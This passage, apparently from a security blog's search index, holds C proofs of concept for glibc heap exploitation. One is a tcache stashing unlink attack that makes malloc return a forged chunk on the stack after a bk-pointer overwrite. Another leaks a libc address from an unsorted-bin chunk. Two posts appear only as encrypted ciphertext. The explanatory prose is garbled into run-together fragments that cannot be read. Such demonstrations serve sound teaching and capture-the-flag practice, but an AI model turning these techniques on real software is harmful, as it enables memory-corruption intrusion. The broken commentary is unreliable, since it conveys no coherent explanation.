class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> stack_var[<span class=\"number\">0x10</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> *chunk_lis[<span class=\"number\">0x10</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> *target;</span><br><span class=\"line\"></span><br><span class=\"line\">    stack_var[<span class=\"number\">3</span>] = (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>)(&amp;stack_var[<span class=\"number\">2</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"stack_var addr is:%p\\n\"</span>,&amp;stack_var[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"chunk_lis addr is:%p\\n\"</span>,&amp;chunk_lis[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"target addr is:%p\\n\"</span>,(<span class=\"keyword\">void</span>*)target);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"You can see the value of fake_chunk-&gt;bk is:%p\\n\\n\"</span>,(<span class=\"keyword\">void</span>*)stack_var[<span class=\"number\">3</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Also, let's see the initial value of stack_var[4]:%p\\n\\n\"</span>,(<span class=\"keyword\">void</span>*)stack_var[<span class=\"number\">4</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Now we alloc 9 chunks with malloc.\\n\\n\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//now we malloc 9 chunks</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; <span class=\"number\">9</span>;i++)&#123;</span><br><span class=\"line\">        chunk_lis[i] = (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>*)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x90</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">3</span>;i &lt; <span class=\"number\">9</span>;i++)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">free</span>(chunk_lis[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"comment\">//last tcache bin</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(chunk_lis[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    <span class=\"comment\">//now they are put into unsorted bin</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(chunk_lis[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(chunk_lis[<span class=\"number\">2</span>]);</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"comment\">//convert into small bin</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0xa0</span>);<span class=\"comment\">// size &gt; 0x90</span></span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"comment\">//now 5 tcache bins</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x90</span>);</span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x90</span>);</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\\n\\n\"</span>,(<span class=\"keyword\">void</span>*)stack_var);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//change victim-&gt;bck</span></span><br><span class=\"line\">    <span class=\"comment\">/*VULNERABILITY*/</span></span><br><span class=\"line\">    chunk_lis[<span class=\"number\">2</span>][<span class=\"number\">1</span>] = (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>)stack_var;</span><br><span class=\"line\">    <span class=\"comment\">/*VULNERABILITY*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//trigger the attack</span></span><br><span class=\"line\">    <span class=\"built_in\">calloc</span>(<span class=\"number\">1</span>,<span class=\"number\">0x90</span>);</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\\n\\n\"</span>,(<span class=\"keyword\">void</span>*)stack_var[<span class=\"number\">2</span>],(<span class=\"keyword\">void</span>*)stack_var[<span class=\"number\">4</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//malloc and return our fake chunk on stack</span></span><br><span class=\"line\">    target = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x90</span>);   </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"As you can see, next malloc(0x90) will return the region our fake chunk: %p\\n\"</span>,(<span class=\"keyword\">void</span>*)target);</span><br><span class=\"line\"></span><br><span class=\"line\">    assert(target == &amp;stack_var[<span class=\"number\">2</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p></p>\n<p><img src=\"/2021/03/08/tcache/image-20210318152451146.png\" alt=\"image-20210318152451146\"></p>\n<p>c6tcache</p>\n<p><img src=\"/2021/03/08/tcache/image-20210318153644695.png\" alt=\"image-20210318153644695\"></p>\n<p>cbins</p>\n<p><img src=\"/2021/03/08/tcache/image-20210318153928275.png\" alt=\"image-20210318153928275\"></p>\n<p>ctcache</p>\n<p><img src=\"/2021/03/08/tcache/image-20210318154115014.png\" alt=\"image-20210318154115014\"></p>\n<p>cache</p>\n<p><img src=\"/2021/03/08/tcache/image-20210318154918326.png\" alt=\"image-20210318154918326\"></p>\n<blockquote>\n<p></p>\n<p>smallbin</p>\n<p><img src=\"/2021/03/08/tcache/image-20210318164858035.png\" alt=\"image-20210318164858035\"></p>\n<p>2bk</p>\n<p>calloc</p>\n<p><img src=\"/2021/03/08/tcache/image-20210318165216882.png\" alt=\"image-20210318165216882\"></p>\n<p>callocchunk<strong>callocchunktcache bin</strong>malloctcache bincallocsize0xa0chunksmall binsmall binFIFOchunk[0]</p>\n<p>smallbin chunk  tcache tcachechunk[2]stack_var smallbin  stack_varbk tcachebin  <strong> chunk[2]stack_var</strong>stack_vartcache bin</p>\n<p><strong>libc0x00007fffffffded0+0x10</strong></p>\n<p><img src=\"/2021/03/08/tcache/image-20210318174356049.png\" alt=\"image-20210318174356049\"></p>\n</blockquote>\n<h2 id=\"5-libc-leak\"><a href=\"#5-libc-leak\" class=\"headerlink\" title=\"5.libc leak\"></a>5.libc leak</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc , <span class=\"keyword\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">long</span>* t[<span class=\"number\">7</span>];</span><br><span class=\"line\">    <span class=\"keyword\">long</span> *a=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x100</span>);</span><br><span class=\"line\">    <span class=\"keyword\">long</span> *b=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// make tcache bin full</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">7</span>;i++)</span><br><span class=\"line\">        t[i]=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x100</span>);</span><br><span class=\"line\">\tsleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">7</span>;i++)</span><br><span class=\"line\">        <span class=\"built_in\">free</span>(t[i]);</span><br><span class=\"line\">\tsleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(a);</span><br><span class=\"line\">\tsleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"comment\">// a is put in an unsorted bin because the tcache bin of this size is full</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"%p\\n\"</span>,a[<span class=\"number\">0</span>]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","categories":[],"tags":["heap"]},{"title":"house of","url":"https://pz1o.top/2021/03/06/house-of/","content":"<script src=\"/crypto-js.js\"></script><script src=\"/mcommon.js\"></script><h3 id=\"encrypt-message\">Please enter the password to read the blog.</h3><link rel=\"stylesheet\" href=\"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css\"> <link rel=\"stylesheet\" href=\"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css\"> <script src=\"//cdn.bootcss.com/jquery/1.11.3/jquery.min.js\"></script> <script src=\"//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js\"></script> <div id=\"security\"> <div> <div class=\"input-group\"> <input type=\"text\" class=\"form-control\" aria-label=\"Enter the password.\" id=\"pass\"/> <div class=\"input-group-btn\"> <button type=\"button\" class=\"btn btn-default\" onclick=\"decryptAES()\">Decrypt</button> </div> </div> </div> </div> <div id=\"encrypt-blog\" style=\"display:none\"> U2FsdGVkX18rMEt3lGEWapCrvisA7CNsJDBqylwmngI= </div>","categories":[],"tags":["heap"]},{"title":"malloc","url":"https://pz1o.top/2021/03/05/malloc/","content":"<script src=\"/crypto-js.js\"></script><script src=\"/mcommon.js\"></script><h3 id=\"encrypt-message\">Please enter the password to read the blog.</h3><link rel=\"stylesheet\" href=\"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css\"> <link rel=\"stylesheet\" href=\"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css\"> <script src=\"//cdn.bootcss.com/jquery/1.11.3/jquery.min.js\"></script> <script src=\"//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js\"></script> <div id=\"security\"> <div> <div class=\"input-group\"> <input type=\"text\" class=\"form-control\" aria-label=\"Enter the password.\" id=\"pass\"/> <div class=\"input-group-btn\"> <button type=\"button\" class=\"btn btn-default\" onclick=\"decryptAES()\">Decrypt</button> </div> </div> </div> </div> <div id=\"encrypt-blog\" style=\"display:none\"> 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